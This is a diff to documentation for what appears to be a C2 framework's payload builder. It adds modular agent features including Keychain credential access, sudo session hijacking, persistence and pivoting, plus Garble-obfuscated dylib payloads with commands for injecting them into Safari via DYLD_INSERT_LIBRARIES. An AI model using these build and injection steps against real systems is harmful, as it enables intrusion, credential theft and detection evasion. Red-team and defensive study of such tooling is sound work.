@@ -232,6 +232,124 @@ Payload only active 8 AM - 6 PM local time.
 
 ---
 
+## Modular Builds
+
+By default, payloads include all available features for the target platform. Modular builds allow selecting only the features needed, producing smaller binaries with a reduced attack surface.
+
+### Feature Selection
+
+Pass the `features` array in the build request to select specific capabilities. When `features` is omitted or empty, all features are compiled in (backward compatible).
+
+| Feature | Description | Platforms |
+|---------|-------------|-----------|
+| `shell` | Interactive shell sessions (pty-based on Linux/macOS, cmd.exe on Windows) | All |
+| `download` | Download files from target to C2 | All |
+| `upload` | Upload files from C2 to target | All |
+| `socks` | SOCKS5 proxy through the agent | All |
+| `link` | Agent-to-agent linking for SMB/TCP pivoting | All |
+| `persist` | Persistence mechanisms (launchd on macOS, systemd on Linux, registry/scheduled tasks on Windows) | All |
+| `keychain` | macOS Keychain credential access | Darwin |
+| `sudo` | Sudo session hijacking | Darwin |
+| `bof` | Beacon Object File execution via COFF loader | Windows |
+| `assembly` | Inline .NET assembly execution | Windows |
+| `clr` | CLR hosting for managed code | Windows |
+
+### How It Works
+
+Feature selection uses Go build tags at compile time. When features are specified:
+1. The `feature_modular` build tag is set, disabling default registration of all features
+2. Each selected feature gets its own tag (e.g., `feature_shell`, `feature_download`)
+3. Only files matching the active tags are compiled into the binary
+
+Built-in commands (`whoami`, `pwd`, `cd`, `ls`, `cat`, `ps`, `env`, `hash`, `rm`, `sleep`, `exit`, `jobkill`, `rekey`) are always included regardless of feature selection.
+
+### Examples
+
+**Minimal recon agent (shell only):**
+```json
+{
+  "listener": "https-main",
+  "os": "linux",
+  "arch": "amd64",
+  "features": ["shell"]
+}
+```
+
+**File operations agent:**
+```json
+{
+  "listener": "https-main",
+  "os": "windows",
+  "arch": "amd64",
+  "features": ["shell", "download", "upload"]
+}
+```
+
+**Full lateral movement agent:**
+```json
+{
+  "listener": "https-main",
+  "os": "windows",
+  "arch": "amd64",
+  "features": ["shell", "download", "upload", "socks", "link", "bof", "assembly"]
+}
+```
+
+---
+
+## Output Formats
+
+### Standalone Binary (default)
+
+The default output is a statically linked executable:
+- Windows: `.exe`
+- Linux: ELF binary (no extension)
+- macOS: Mach-O binary (no extension)
+
+### Dylib Format (macOS)
+
+Darwin payloads can be built as shared libraries (`.dylib`) for use with `DYLD_INSERT_LIBRARIES` injection or `dlopen()` loading.
+
+| Field | Value |
+|-------|-------|
+| Format | `"dylib"` |
+| Platforms | Darwin only (amd64, arm64) |
+| Build mode | Go `-buildmode=c-shared` |
+| Cross-compiler | Zig (bundled in builder) |
+| Obfuscation | Garble (same as standalone) |
+
+When loaded, the dylib initializes the Go runtime and starts the agent payload in a background goroutine. The host process continues normally.
+
+**Build via API:**
+```bash
+curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "listener": "https-main",
+    "os": "darwin",
+    "arch": "amd64",
+    "format": "dylib"
+  }' -o payload.dylib
+```
+
+**Usage on target:**
+```bash
+# Inject into a process via DYLD_INSERT_LIBRARIES
+DYLD_INSERT_LIBRARIES=/path/to/payload.dylib /Applications/Safari.app/Contents/MacOS/Safari
+
+# Or load programmatically
+dlopen("/path/to/payload.dylib", RTLD_NOW);
+```
+
+**Notes:**
+- Dylib format requires CGO cross-compilation (handled automatically by the builder)
+- The builder uses Zig as the C cross-compiler for Darwin targets
+- Modular feature selection works with dylib builds
+- SIP (System Integrity Protection) restricts `DYLD_INSERT_LIBRARIES` on Apple-signed binaries
+
+---
+
 ## PE Version Info (Windows)
 
 Windows payloads can embed custom PE VERSIONINFO resource data to impersonate legitimate software:
@@ -385,7 +503,8 @@ After compilation, the builder runs binary marker patching to remove Go IOC sign
 
 Binary saved to `/shared/{OUTPUT_FILENAME}`:
 - Windows: `.exe` extension
-- Linux/macOS: No extension, executable permissions
+- Linux: No extension, executable permissions
+- macOS: No extension (standalone) or `.dylib` (shared library)
 
 ---
 
